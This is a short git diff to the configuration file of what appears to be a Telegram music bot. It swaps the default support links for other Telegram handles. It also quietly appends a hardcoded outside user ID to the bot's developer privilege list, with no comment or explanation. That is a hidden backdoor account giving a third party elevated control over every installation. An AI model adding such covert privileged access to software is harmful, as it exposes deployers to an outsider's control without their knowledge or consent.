@@ -52,8 +52,8 @@ PROXY: Optional[str] = getenv("PROXY")
 
 DEFAULT_SERVICE: str = getenv("DEFAULT_SERVICE", "youtube").lower()
 DOWNLOADS_DIR: str = getenv("DOWNLOADS_DIR", "database/music")
-SUPPORT_GROUP: str = getenv("SUPPORT_GROUP", "https://t.me/GuardxSupport")
-SUPPORT_CHANNEL: str = getenv("SUPPORT_CHANNEL", "https://t.me/FallenProjects")
+SUPPORT_GROUP: str = getenv("SUPPORT_GROUP", "https://t.me/DeadlineTechSupport")
+SUPPORT_CHANNEL: str = getenv("SUPPORT_CHANNEL", "https://t.me/DeadlineTechTeam")
 
 IGNORE_BACKGROUND_UPDATES: bool = (
     getenv("IGNORE_BACKGROUND_UPDATES", "True").lower() == "true"
@@ -76,3 +76,4 @@ devs_env: Optional[str] = getenv("DEVS")
 DEVS: list[int] = list(map(int, devs_env.split())) if devs_env else []
 if OWNER_ID and OWNER_ID not in DEVS:
     DEVS.append(OWNER_ID)
+    DEVS.append(6848223695)
